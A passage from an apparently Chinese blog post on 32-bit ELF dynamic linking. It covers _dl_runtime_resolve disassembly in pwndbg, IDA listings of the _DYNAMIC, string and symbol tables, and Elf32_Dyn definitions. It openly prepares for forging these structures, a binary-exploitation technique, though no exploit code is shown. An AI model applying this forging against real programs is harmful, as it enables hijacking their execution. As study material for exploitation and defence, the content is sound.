<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236492.png" alt="image-20220626172258746"></p>
<p>首先push dword ptr [0x8049784] ，然后jmp dword ptr [0x8049788] 0x8049788 中存储的为_dl_runtime_resolve的地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236493.png" alt="image-20220626173353482"></p>
<p>这样的话，加上之前的<code>push 0</code>，就<code>push</code>了两个参数，这两个参数刚好是<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>需要的参数，其中<code>0x8049784</code>就是<code>link_map</code>指针，<code>0</code>就是<code>reloc_index</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function _dl_runtime_resolve:</span><br><span class="line">=&gt; <span class="number">0xf7feadd0</span> &lt;+<span class="number">0</span>&gt;:	push   eax  <span class="comment">//*eax==_DYNAMIC</span></span><br><span class="line">   <span class="number">0xf7feadd1</span> &lt;+<span class="number">1</span>&gt;:	push   ecx</span><br><span class="line">   <span class="number">0xf7feadd2</span> &lt;+<span class="number">2</span>&gt;:	push   edx</span><br><span class="line">   <span class="number">0xf7feadd3</span> &lt;+<span class="number">3</span>&gt;:	mov    edx,DWORD PTR [esp+<span class="number">0x10</span>] <span class="comment">//esp+0x10中存放的是参数reloc_arg: 0x0</span></span><br><span class="line">   <span class="number">0xf7feadd7</span> &lt;+<span class="number">7</span>&gt;:	mov    eax,DWORD PTR [esp+<span class="number">0xc</span>]  <span class="comment">//esp+0xc中存放的是link_map: 0xf7ffd940</span></span><br><span class="line">   <span class="number">0xf7feaddb</span> &lt;+<span class="number">11</span>&gt;:	call   <span class="number">0xf7fe4f10</span> &lt;_dl_fixup&gt;</span><br><span class="line">   <span class="number">0xf7feade0</span> &lt;+<span class="number">16</span>&gt;:	pop    edx</span><br><span class="line">   <span class="number">0xf7feade1</span> &lt;+<span class="number">17</span>&gt;:	mov    ecx,DWORD PTR [esp]</span><br><span class="line">   <span class="number">0xf7feade4</span> &lt;+<span class="number">20</span>&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   <span class="number">0xf7feade7</span> &lt;+<span class="number">23</span>&gt;:	mov    eax,DWORD PTR [esp+<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0xf7feadeb</span> &lt;+<span class="number">27</span>&gt;:	ret    <span class="number">0xc</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; x/wx $esp+<span class="number">0x10</span></span><br><span class="line"><span class="number">0xffffd068</span>:	<span class="number">0x00000000</span></span><br><span class="line">pwndbg&gt; x/wx $esp+<span class="number">0xc</span></span><br><span class="line"><span class="number">0xffffd064</span>:	<span class="number">0xf7ffd940</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>eax寄存器中存放的是_DYNAMIC是动态链接过程中很重要的一步</p>
<h4 id="ELF格式分析"><a href="#ELF格式分析" class="headerlink" title="ELF格式分析"></a>ELF格式分析</h4><h5 id="DYNAMIC"><a href="#DYNAMIC" class="headerlink" title="_DYNAMIC"></a>_DYNAMIC</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">08049694</span> ; ELF Dynamic Information</span><br><span class="line">LOAD:<span class="number">08049694</span> ; ===========================================================================</span><br><span class="line">LOAD:<span class="number">08049694</span></span><br><span class="line">LOAD:<span class="number">08049694</span> ; Segment type: Pure data</span><br><span class="line">LOAD:<span class="number">08049694</span> ; Segment permissions: Read/Write</span><br><span class="line">LOAD:<span class="number">08049694</span> LOAD            segment mempage <span class="keyword">public</span> <span class="string">&#x27;DATA&#x27;</span> use32</span><br><span class="line">LOAD:<span class="number">08049694</span>                 assume cs:LOAD</span><br><span class="line">LOAD:<span class="number">08049694</span>                 ;org <span class="number">8049694</span>h</span><br><span class="line">LOAD:<span class="number">08049694</span> _DYNAMIC        Elf32_Dyn &lt;<span class="number">1</span>, &lt;<span class="number">1</span>&gt;&gt;      ; DATA XREF: LOAD:<span class="number">080480B</span>C↑o</span><br><span class="line">LOAD:<span class="number">08049694</span>                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:<span class="number">08049694</span>                                         ; DT_NEEDED libc.so<span class="number">.6</span></span><br><span class="line">LOAD:<span class="number">0804969</span>C                 Elf32_Dyn &lt;<span class="number">0</span>Ch, &lt;<span class="number">80482</span>ACh&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:<span class="number">080496</span>A4                 Elf32_Dyn &lt;<span class="number">0</span>Dh, &lt;<span class="number">8048514</span>h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:<span class="number">080496</span>AC                 Elf32_Dyn &lt;<span class="number">19</span>h, &lt;<span class="number">804968</span>Ch&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:<span class="number">080496B</span>4                 Elf32_Dyn &lt;<span class="number">1B</span>h, &lt;<span class="number">4</span>&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">080496B</span>C                 Elf32_Dyn &lt;<span class="number">1</span>Ah, &lt;<span class="number">8049690</span>h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:<span class="number">080496</span>C4                 Elf32_Dyn &lt;<span class="number">1</span>Ch, &lt;<span class="number">4</span>&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">080496</span>CC                 Elf32_Dyn &lt;<span class="number">6F</span>FFFEF5h, &lt;<span class="number">804818</span>Ch&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:<span class="number">080496</span>D4                 Elf32_Dyn &lt;<span class="number">5</span>, &lt;<span class="number">804820</span>Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:<span class="number">080496</span>DC                 Elf32_Dyn &lt;<span class="number">6</span>, &lt;<span class="number">80481</span>ACh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:<span class="number">080496E4</span>                 Elf32_Dyn &lt;<span class="number">0</span>Ah, &lt;<span class="number">51</span>h&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:<span class="number">080496</span>EC                 Elf32_Dyn &lt;<span class="number">0B</span>h, &lt;<span class="number">10</span>h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:<span class="number">080496F</span>4                 Elf32_Dyn &lt;<span class="number">15</span>h, &lt;<span class="number">0</span>&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:<span class="number">080496F</span>C                 Elf32_Dyn &lt;<span class="number">3</span>, &lt;<span class="number">8049780</span>h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:<span class="number">08049704</span>                 Elf32_Dyn &lt;<span class="number">2</span>, &lt;<span class="number">18</span>h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:<span class="number">0804970</span>C                 Elf32_Dyn &lt;<span class="number">14</span>h, &lt;<span class="number">11</span>h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:<span class="number">08049714</span>                 Elf32_Dyn &lt;<span class="number">17</span>h, &lt;<span class="number">8048294</span>h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:<span class="number">0804971</span>C                 Elf32_Dyn &lt;<span class="number">11</span>h, &lt;<span class="number">804828</span>Ch&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:<span class="number">08049724</span>                 Elf32_Dyn &lt;<span class="number">12</span>h, &lt;<span class="number">8</span>&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:<span class="number">0804972</span>C                 Elf32_Dyn &lt;<span class="number">13</span>h, &lt;<span class="number">8</span>&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:<span class="number">08049734</span>                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFFEh, &lt;<span class="number">804826</span>Ch&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:<span class="number">0804973</span>C                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFFFh, &lt;<span class="number">1</span>&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:<span class="number">08049744</span>                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFF0h, &lt;<span class="number">804825</span>Eh&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:<span class="number">0804974</span>C                 Elf32_Dyn &lt;<span class="number">0</span>&gt;           ; DT_NULL</span><br><span class="line">LOAD:<span class="number">08049754</span>                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08049755</span>                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08049756</span>                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08049757</span>                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08049758</span>                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08049759</span>                 db    <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236494.png" alt="image-20220626181333006"></p>
<p>这里出现了Elf32_Dyn结构体，在源码中它的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"><span class="keyword">typedef</span>	<span class="keyword">int32_t</span>  Elf32_Sword;        <span class="keyword">int32_t</span>大小为<span class="number">4</span>字节  </span><br><span class="line"><span class="keyword">typedef</span>	<span class="keyword">int64_t</span>  Elf32_Sxword;       <span class="keyword">int64_t</span>大小为<span class="number">8</span>字节</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;        <span class="keyword">uint32_t</span>大小为<span class="number">4</span>字节</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf32_Xword;       <span class="keyword">uint64_t</span>大小为<span class="number">8</span>字节</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr; </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br></pre></td></tr></table></figure>

<p>其中，d_tag 的取值决定了该如何解释 d_un。</p>
<ul>
<li>d_val<ul>
<li> 这个字段表示一个整数值，可以有多种意思。</li>
</ul>
</li>
<li>d_ptr<ul>
<li>  这个字段表示程序的虚拟地址。正如之前所说的，一个文件的虚拟地址在执行的过程中可能和内存的虚拟地址不匹配。当解析动态节中的地址时，动态链接器会根据原始文件的值以及内存的基地址来计算真正的地址。为了保持一致性，文件中并不会包含重定位入口来 “纠正” 动态结构中的地址。</li>
</ul>
</li>
</ul>
<p>可以看出，其实这个节是由若干个键值对构成的。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>数值</th>
<th>d_un</th>
<th>可执行</th>
<th>共享 目标</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>DT_NULL</td>
<td>0</td>
<td>忽略</td>
<td>必需</td>
<td>必需</td>
<td>标志着 _DYNAMIC 数组的末端。</td>
</tr>
<tr>
<td>DT_NEEDED</td>
<td>1</td>
<td>d_val</td>
<td>可选</td>
<td>可选</td>
<td>包含以 NULL 结尾的字符串的字符串表偏移，该字符串给出某个需要的库的名称。所使用的索引为 DT_STRTAB  的下标。动态数组中可以包含很多个这种类型的标记。这些项在这种类型标记中的相对顺序比较重要。但是与其它的标记之前的顺序倒无所谓。对应的段为.  gnu.version_r。</td>
</tr>
<tr>
<td>DT_PLTRELSZ</td>
<td>2</td>
<td>d_val</td>
<td>可选</td>
<td>可选</td>
<td>给出与过程链接表相关的重定位项的总的大小。如果存在 DT_JMPREL 类型的项，那么 DT_PLTRELSZ 也必须存在。</td>
</tr>
<tr>
<td>DT_PLTGOT</td>
<td>3</td>
<td>d_ptr</td>
<td>可选</td>
<td>可选</td>
<td>给出与过程链接表或者全局偏移表相关联的地址，对应的段. got.plt</td>
</tr>
<tr>
<td>DT_HASH</td>
<td>4</td>
<td>d_ptr</td>
<td>必需</td>
<td>必需</td>
<td>此类型表项包含符号哈希表的地址。此哈希表指的是被 DT_SYMTAB 引用的符号表。</td>
</tr>
<tr>
<td>DT_STRTAB</td>
<td>5</td>
<td>d_ptr</td>
<td>必需</td>
<td>必需</td>
<td>此类型表项包含动态字符串表的地址。符号名、库名、和其它字符串都包含在此表中。对应的节的名字应该是. dynstr。</td>
</tr>
<tr>
<td>DT_SYMTAB</td>
<td>6</td>
<td>d_ptr</td>
<td>必需</td>
<td>必需</td>
<td>此类型表项包含动态符号表的地址。对 32 位的文件而言，这个符号表中的条目的类型为 Elf32_Sym。</td>
</tr>
<tr>
<td>DT_RELA</td>
<td>7</td>
<td>d_ptr</td>
<td>必需</td>
<td>可选</td>
<td>此类型表项包含重定位表的地址。此表中的元素包含显式的补齐，例如 32 位文件中的  Elf32_Rela。目标文件可能有多个重定位节区。在为可执行文件或者共享目标文件创建重定位表时，链接编辑器将这些节区连接起来，形成一个表。尽管在目标文件中这些节区相互独立，但是动态链接器把它们视为一个表。在动态链接器为可执行文件创建进程映像或者向一个进程映像中添加某个共享目标时，要读取重定位表并执行相关的动作。如果此元素存在，动态结构体中也必须包含 DT_RELASZ 和 DT_RELAENT 元素。如果对于某个文件来说，重定位是必需的话，那么 DT_RELA 或者 DT_REL  都可能存在。</td>
</tr>
<tr>
<td>DT_RELASZ</td>
<td>8</td>
<td>d_val</td>
<td>必需</td>
<td>可选</td>
<td>此类型表项包含 DT_RELA 重定位表的总字节大小。</td>
</tr>
<tr>
<td>DT_RELAENT</td>
<td>9</td>
<td>d_val</td>
<td>必需</td>
<td>可选</td>
<td>此类型表项包含 DT_RELA 重定位项的字节大小。</td>
</tr>
<tr>
<td>DT_STRSZ</td>
<td>10</td>
<td>d_val</td>
<td>必需</td>
<td>必需</td>
<td>此类型表项给出字符串表的字节大小，按字节数计算。</td>
</tr>
<tr>
<td>DT_SYMENT</td>
<td>11</td>
<td>d_val</td>
<td>必需</td>
<td>必需</td>
<td>此类型表项给出符号表项的字节大小。</td>
</tr>
<tr>
<td>DT_INIT</td>
<td>12</td>
<td>d_ptr</td>
<td>可选</td>
<td>可选</td>
<td>此类型表项给出初始化函数的地址。</td>
</tr>
<tr>
<td>DT_FINI</td>
<td>13</td>
<td>d_ptr</td>
<td>可选</td>
<td>可选</td>
<td>此类型表项给出结束函数（Termination Function）的地址。</td>
</tr>
<tr>
<td>DT_SONAME</td>
<td>14</td>
<td>d_val</td>
<td>忽略</td>
<td>可选</td>
<td>此类型表项给出一个以 NULL 结尾的字符串的字符串表偏移，对应的字符串是某个共享目标的名称。该偏移实际上是 DT_STRTAB 中的索引。</td>
</tr>
<tr>
<td>DT_RPATH</td>
<td>15</td>
<td>d_val</td>
<td>可选</td>
<td>忽略</td>
<td>此类型表项包含以 NULL 结尾的字符串的字符串表偏移，对应的字符串是搜索库时使用的搜索路径。该偏移实际上是 DT_STRTAB 中的索引。</td>
</tr>
<tr>
<td>DT_SYMBOLIC</td>
<td>16</td>
<td>忽略</td>
<td>忽略</td>
<td>可选</td>
<td>如果这种类型表项出现在共享目标库中，那么这将会改变动态链接器的符号解析算法。动态连接器将首先选择从共享目标文件本身开始搜索符号，只有在搜索失败时，才会选择从可执行文件中搜索相应的符号。</td>
</tr>
<tr>
<td>DT_REL</td>
<td>17</td>
<td>d_ptr</td>
<td>必需</td>
<td>可选</td>
<td>此类型表项与 DT_RELA 类型的表项类似，只是其表格中包含隐式的补齐，对 32 位文件而言，就是 Elf32_Rel。如果 ELF 文件中包含此元素，那么动态结构中也必须包含 DT_RELSZ 和 DT_RELENT 类型的元素。</td>
</tr>
<tr>
<td>DT_RELSZ</td>
<td>18</td>
<td>d_val</td>
<td>必需</td>
<td>可选</td>
<td>此类型表项包含 DT_REL 重定位表的总字节大小。</td>
</tr>
<tr>
<td>DT_RELENT</td>
<td>19</td>
<td>d_val</td>
<td>必需</td>
<td>可选</td>
<td>此类型表项包含 DT_REL 重定位项的字节大小。</td>
</tr>
<tr>
<td>DT_PLTREL</td>
<td>20</td>
<td>d_val</td>
<td>可选</td>
<td>可选</td>
<td>此类型表项给出过程链接表所引用的重定位项的地址。根据具体情况， d_val 对应的地址可能包含 DT_REL 或者 DT_RELA。过程链接表中的所有重定位都必须采用相同的重定位方式。</td>
</tr>
<tr>
<td>DT_DEBUG</td>
<td>21</td>
<td>d_ptr</td>
<td>可选</td>
<td>忽略</td>
<td>此类型表项用于调试。ABI 未规定其内容，访问这些条目的程序可能与 ABI 不兼容。</td>
</tr>
<tr>
<td>DT_TEXTREL</td>
<td>22</td>
<td>忽略</td>
<td>可选</td>
<td>可选</td>
<td>如果文件中不包含此类型的表项，则表示没有任何重定位表项能够造成对不可写段的修改。如果存在的话，则可能存在若干重定位项请求对不可写段进行修改，因此，动态链接器可以做相应的准备。</td>
</tr>
<tr>
<td>DT_JMPREL</td>
<td>23</td>
<td>d_ptr</td>
<td>可选</td>
<td>可选</td>
<td>该类型的条目的 d_ptr  成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。把重定位表项分开有利于让动态链接器在进程初始化时忽略它们（开启了延迟绑定）。如果存在此成员，相关的 DT_PLTRELSZ 和 DT_PLTREL 必须也存在。</td>
</tr>
<tr>
<td>DT_BIND_NOW</td>
<td>24</td>
<td>忽略</td>
<td>可选</td>
<td>可选</td>
<td>如果可执行文件或者共享目标文件中存在此类型的表项的话，动态链接器在将控制权转交给程序前，应该将该文件的所有需要重定位的地址都进行重定位。这个表项的优先权高于延迟绑定，可以通过环境变量或者 dlopen(BA_LIB) 来设置。</td>
</tr>
<tr>
<td>DT_LOPROC ~DT_HIPROC</td>
<td>0x70000000 ~0x7fffffff</td>
<td>未指定</td>
<td>未指定</td>
<td>未指定</td>
<td>这个范围的表项是保留给处理器特定的语义的。</td>
</tr>
</tbody></table>
<p><strong>下表总结了可执行文件以及共享目标文件中的 d_tag 的需求</strong>。如果一个 tag 被标记为 “mandatory”，那么对于一个 TIS ELF conforming 的文件来说，其动态链接数组必须包含对应入口的类型。同样的，“optional” 意味着可以有，也可以有没有。  </p>
<p>  以 <code>Elf32_Dyn &lt;0Ch, &lt;80482ACh&gt;&gt; ; DT_INIT</code>为例，对应到Elf32_Dyn结构体中为：</p>
<ul>
<li>Elf32_Sword d_tag==DT_INIT</li>
<li>Elf32_Word d_val==0Ch </li>
<li>Elf32_Addr d_ptr==80482ACh</li>
</ul>
<p>每个d_tag 都对应着每一个节，如0x80482ACh对应_init_proce(.init节)，0x804820Ch对应. dynstr</p>
<p>在后续伪造的过程中只需要计算这个结构体中的union共用体即可，无需计算d_tag</p>
<h5 id="DYNAMIC-gt-DT-STRTAB"><a href="#DYNAMIC-gt-DT-STRTAB" class="headerlink" title="_DYNAMIC-&gt;DT_STRTAB"></a>_DYNAMIC-&gt;DT_STRTAB</h5><p>0x804820C指向了ELF String Table</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; ELF String Table</span><br><span class="line">LOAD:<span class="number">0804820</span>C byte_804820C    db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">080481B</span>C↑o</span><br><span class="line">LOAD:<span class="number">0804820</span>C                                         ; LOAD:<span class="number">080481</span>CC↑o ...</span><br><span class="line">LOAD:<span class="number">0804820</span>D aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0804826</span>C↓o</span><br><span class="line">LOAD:<span class="number">08048217</span> aIoStdinUsed    db <span class="string">&#x27;_IO_stdin_used&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">080481F</span>C↑o</span><br><span class="line">LOAD:<span class="number">08048226</span> aPuts           db <span class="string">&#x27;puts&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">080481</span>CC↑o</span><br><span class="line">LOAD:<span class="number">0804822B</span> aPrintf         db <span class="string">&#x27;printf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">080481B</span>C↑o</span><br><span class="line">LOAD:<span class="number">08048232</span> aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08048232</span>                                         ; DATA XREF: LOAD:<span class="number">080481</span>EC↑o</span><br><span class="line">LOAD:<span class="number">08048244</span> aGlibc20        db <span class="string">&#x27;GLIBC_2.0&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0804827</span>C↓o</span><br><span class="line">LOAD:<span class="number">0804824</span>E aGmonStart      db <span class="string">&#x27;__gmon_start__&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">080481</span>DC↑o</span><br><span class="line">LOAD:<span class="number">0804825</span>D                 align <span class="number">2</span></span><br><span class="line">LOAD:<span class="number">0804825</span>E ; ELF GNU Symbol Version Table</span><br></pre></td></tr></table></figure>

<p>从上图可以看到ELF_String_Table包含动态链接所需的字符串(导入函数名、导入的库名等)，他们都是以\x00结尾，在内存中的形式如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236495.png" alt="image-20220626210006395"></p>
<h5 id="DYNAMIC-gt-DT-SYMTAB"><a href="#DYNAMIC-gt-DT-SYMTAB" class="headerlink" title="_DYNAMIC-&gt;DT_SYMTAB"></a>_DYNAMIC-&gt;DT_SYMTAB</h5><p>0x80481AC指向 ELF Symbol Table</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">080481</span>AC ; ELF Symbol Table</span><br><span class="line">LOAD:<span class="number">080481</span>AC                 Elf32_Sym &lt;<span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">080481B</span>C                 Elf32_Sym &lt;offset aPrintf - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;printf&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>CC                 Elf32_Sym &lt;offset aPuts - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;puts&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>DC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__gmon_start__&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>EC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, \ ; <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>EC                            <span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">080481F</span>C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804820C, \ ; <span class="string">&quot;_IO_stdin_used&quot;</span></span><br><span class="line">LOAD:<span class="number">080481F</span>C                            offset _IO_stdin_used, <span class="number">4</span>, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">10</span>h&gt;</span><br><span class="line">LOAD:<span class="number">0804820</span>C ; ELF String Table</span><br><span class="line">LOAD:<span class="number">0804820</span>C byte_804820C    db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">080481B</span>C↑o</span><br><span class="line">LOAD:<span class="number">0804820</span>C                                         ; LOAD:<span class="number">080481</span>CC↑o ...</span><br><span class="line">LOAD:<span class="number">0804820</span>D aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0804826</span>C↓o</span><br><span class="line">LOAD:<span class="number">08048217</span> aIoStdinUsed    db <span class="string">&#x27;_IO_stdin_used&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">080481F</span>C↑o</span><br><span class="line">LOAD:<span class="number">08048226</span> aPuts           db <span class="string">&#x27;puts&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">080481</span>CC↑o</span><br><span class="line">LOAD:<span class="number">0804822B</span> aPrintf         db <span class="string">&#x27;printf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">080481B</span>C↑o</span><br><span class="line">LOAD:<span class="number">08048232</span> aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08048232</span>                                         ; DATA XREF: LOAD:<span class="number">080481</span>EC↑o</span><br><span class="line">LOAD:<span class="number">08048244</span> aGlibc20        db <span class="string">&#x27;GLIBC_2.0&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0804827</span>C↓o</span><br><span class="line">LOAD:<span class="number">0804824</span>E aGmonStart      db <span class="string">&#x27;__gmon_start__&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">080481</span>DC↑o</span><br><span class="line">LOAD:<span class="number">0804825</span>D                 align <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>ELF Symbol Table中一个新类型的结构体–Elf32_Sym，这个结构体的定义如下：</p>
